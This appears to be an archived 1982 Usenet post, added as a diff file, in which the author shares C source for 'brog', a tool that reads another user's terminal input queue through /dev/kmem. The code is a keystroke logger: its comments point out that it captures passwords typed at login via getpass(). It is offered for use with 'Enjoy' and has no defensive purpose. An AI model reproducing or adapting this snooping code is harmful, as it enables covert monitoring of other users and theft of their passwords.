@@ -1,0 +1,109 @@
+Newsgroups: net.unix-wizards
+Subject: I felt slightly obnoxious, so....
+From: UDel-Relay@sri-unix
+Date: Dec 10, 1982, 5:34:02 PM (as displayed by Google Groups)
+Source: https://groups.google.com/g/net.unix-wizards/c/wYHgahJ8DhA/m/esTjEAgATlsJ
+Mirror: https://usenet.trashworldnews.com/?thread=57616
+Retrieved: 2026-10-31. Message body below is verbatim. Google Groups masks e-mail addresses
+in the From line; full addresses appear in the body where the author signed them.
+------------------------------------------------------------------------
+From:     Khron The Elder <rehmi.umcp-cs@UDel-Relay>
+Date:     6 Dec 82 20:29:25 EST  (Mon)
+I wrote a cute lil program several months ago that made me a collector....
+I won't say what it does.... All people I've talked to said they haven't seen
+any such program in Unix. For what it's worth.........
+
+-----------------------------------------------------------------------------
+static char *sccsid="brog.c KtE (aka Rehmi) U of Mud Sep. 11 1982";
+/*
+ *  brog - (this name has no mnemonic value whatsoever......)
+ *  watch someone else's input queue, works well unless they're in
+ *  a mode where chars are gobbled quickly, id est raw or cbreak.
+ *  This also works on output queues but loses because the drivers snarf
+ *  too quickly. Assumes a readable /dev/kmem.
+ *  (Btw, getpass() doesn't usually put the term into a gobble mode...)
+ *  [As in from 'login'...]
+ */
+#include <sys/types.h>
+#include <stdio.h>
+#define CBSIZE 28
+#define CROUND 0x1F
+#define BUF 4096
+#define WaitMuch 250
+#include <sys/clist.h>
+#include <sys/tty.h>
+#include <nlist.h>
+
+struct nlist nl[] = {{"_dz_tty"}, {"_dh11"}, {"_cons"}, {0}, };
+/* Our system happens to have tty's 0-15 on dz's, the rest (16-63) on dh's */
+#define X_DZ_TTY 0
+#define X_DH11	1
+#define X_CONS 2
+
+main(argc, argv)
+int argc;
+char **argv;
+{
+	int wbuf();
+	struct tty *thistty, *rootty, tt;
+	struct clist *physaddr;
+	int kmemfd;
+	char *old_cl=0;
+	int old_cc=0;
+	
+	register char cbuf[BUF], outbuf[BUF];
+	register unsigned int i, j, k;
+	register struct cblock *foo;
+
+	nlist("/vmunix", nl);
+	j=atoi(argv[1]);
+	if(argv[1][0]=='c')
+		rootty=(struct tty *)nl[X_CONS].n_value;
+	else
+		rootty=(struct tty *)nl[(j<16) ? X_DZ_TTY : X_DH11].n_value;
+
+	thistty=rootty+((j<16) ? j : (j-16));
+	physaddr= &(thistty->t_rawq);
+
+	kmemfd=open("/dev/kmem",0);
+loop:
+#ifdef SLEEP
+	ipcmessagewait(-1, WaitMuch);
+#endif
+	lseek(kmemfd, (char *)physaddr, 0);
+	read(kmemfd, &tt.t_rawq, sizeof tt.t_rawq);
+	j=tt.t_rawq.c_cc;
+
+	if (j){
+	  if(j<old_cc) { outbuf[k++]='\n'; write(1, outbuf, k); }
+	  lseek(kmemfd, tt.t_rawq.c_cf-4, 0);
+	  read(kmemfd, cbuf, BUF);
+	  foo=(struct cblock *)cbuf;
+	  k=i=0;
+	  for(;;) {
+	    k+=wbuf(outbuf+k, foo->c_info,
+		    ((j-k)>=CBSIZE ? CBSIZE : (j-k)));
+	    i=((int)foo->c_next)-((int)tt.t_rawq.c_cf-4);
+	    if((i<BUF) && (i>=0) && (k<j))
+	      foo=(struct cblock *)(cbuf+i);
+	    else
+	      break;
+            }
+	  old_cc=j;
+	  }
+	goto loop;
+}
+
+int wbuf(to, from, n)
+register char *to, *from;
+register int n;
+{
+	int m=n;
+	
+	while(n--) *to++ = *from++;
+	return(m);
+}
+
+-----------------------------------------------------------------------------
+Enjoy.... 
+						-Rehmi-
